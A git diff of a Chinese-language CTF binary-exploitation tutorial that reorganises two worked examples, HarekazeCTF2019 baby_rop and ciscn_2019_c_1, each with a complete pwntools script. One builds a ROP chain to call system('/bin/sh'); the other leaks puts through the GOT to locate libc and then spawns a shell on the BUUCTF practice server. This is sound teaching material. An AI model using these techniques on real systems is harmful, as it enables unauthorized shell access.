@@ -1594,6 +1594,54 @@ ROP（Return Oriented Programming）的本质是：
 * Chain: 通过精心构造栈布局，让 `ret` 指令不断连接不同的 Gadgets，像链条一样执行一连串操作。
 
 
+#### 例题 1：[HarekazeCTF2019]baby_rop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
+
+<img width="335" height="121" alt="ef278c62e6196864e436221f2bb4cc4b" src="https://github.com/user-attachments/assets/cb63746c-f09f-4059-b144-a8c79d8fee3e" />
+
+栈不可执行。
+
+<img width="341" height="45" alt="d1b5c630feabbb7668edfdc7fc77a055" src="https://github.com/user-attachments/assets/b124bc63-c2c2-42a2-9db4-f48b8378a3a1" />
+
+`rdi_pop_ret = 0x400683`
+
+打开 IDA 发现 没有后门函数，但是有 binsh：
+
+<img width="506" height="183" alt="image" src="https://github.com/user-attachments/assets/182b09ff-7b65-48c3-bcc2-ad9b5c6ec68c" />
+
+主函数还有一个 system：
+
+<img width="1006" height="318" alt="image" src="https://github.com/user-attachments/assets/70481f40-4158-4e6d-816f-6b5e6b01f831" />
+
+<img width="730" height="392" alt="image" src="https://github.com/user-attachments/assets/8a4b4213-3c31-442f-8322-929f042b0bb7" />
+
+那么 这就是一个普通的 rop 链。
+
+```
+# written by Sonnety
+from pwn import*
+context.arch = "amd64"
+
+host = "node5.buuoj.cn"
+port = 29812
+
+io=remote(host,port)
+offset = 24
+system = 0x400490
+binsh = 0x601048
+pop_rdi_ret = 0x400683
+payload = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)
+
+def main():
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+
 ### Ret2libc
 
 > 前文提到 ASLR，PLT，GOT 可复习。
@@ -1662,50 +1710,55 @@ RSP ->| 0x7fff... |   | 0x400c83    |  <-- pop_rdi_ret (Gadget地址)
 
 重新从 main 开始运行。我们获得了第二次输入的机会。
 
-### 例题 1：[HarekazeCTF2019]baby_rop
+#### 例题 1：ciscn_2019_c_1
 
-[BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)
 
-<img width="335" height="121" alt="ef278c62e6196864e436221f2bb4cc4b" src="https://github.com/user-attachments/assets/cb63746c-f09f-4059-b144-a8c79d8fee3e" />
+<img width="1278" height="564" alt="b21603601caff8e0a9ee4dd549f048e4" src="https://github.com/user-attachments/assets/a567a28c-83f9-431e-8fea-84b68e9d294f" />
 
-栈不可执行。
+简单说就是只有操作 1 能用，看看函数。
 
-<img width="341" height="45" alt="d1b5c630feabbb7668edfdc7fc77a055" src="https://github.com/user-attachments/assets/b124bc63-c2c2-42a2-9db4-f48b8378a3a1" />
+<img width="1277" height="547" alt="83e73e73f2cd24ac8e04693c69a7acd2" src="https://github.com/user-attachments/assets/d8123936-3015-4828-bffc-131a2948451f" />
 
-`rdi_pop_ret = 0x400683`
+可以看到有一个异或操作会让我们的payload乱掉，但是 `strlen()` 遇到 `/0` 就停，所以可以绕过。
 
-打开 IDA 发现 没有后门函数，但是有 binsh：
+<img width="384" height="57" alt="883a364344a08da7b1120df03634fd9f" src="https://github.com/user-attachments/assets/44757be5-3929-4bc2-8d03-8b13a286bcfc" />
 
-<img width="506" height="183" alt="image" src="https://github.com/user-attachments/assets/182b09ff-7b65-48c3-bcc2-ad9b5c6ec68c" />
-
-主函数还有一个 system：
-
-<img width="1006" height="318" alt="image" src="https://github.com/user-attachments/assets/70481f40-4158-4e6d-816f-6b5e6b01f831" />
-
-<img width="730" height="392" alt="image" src="https://github.com/user-attachments/assets/8a4b4213-3c31-442f-8322-929f042b0bb7" />
-
-那么 这就是一个普通的 rop 链。
+<img width="525" height="252" alt="88f295a69f4ee40ffdb47c15bef8d760" src="https://github.com/user-attachments/assets/93cd5e46-4900-426c-aac9-063361191418" />
 
 ```
 # written by Sonnety
-from pwn import*
+from pwn import *
 context.arch = "amd64"
 
 host = "node5.buuoj.cn"
-port = 29812
-
-io=remote(host,port)
-offset = 24
-system = 0x400490
-binsh = 0x601048
-pop_rdi_ret = 0x400683
-payload = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)
+port = 26159
+io = remote(host,port)
+elf = ELF("./ciscn_2019_c_1")
+offset = 0x57
+padding = b'\0' + b"A"*offset
+pop_rdi_ret = 0x400c83
+ret = 0x400c84
+encrypt = 0x4009A0
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)
 
 def main():
-    io.sendline(payload)
+    io.recvuntil(b"Input your choice!\n")
+    io.sendline(b"1")
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_1)
+    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
+    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
+    system_addr = puts_addr - 0x31580
+    binsh_addr = puts_addr + 0x1334da
+    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
+	# + ret 栈对齐
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_2)
     io.interactive()
-
+    
 if __name__ == "__main__":
     main()
 ```
-
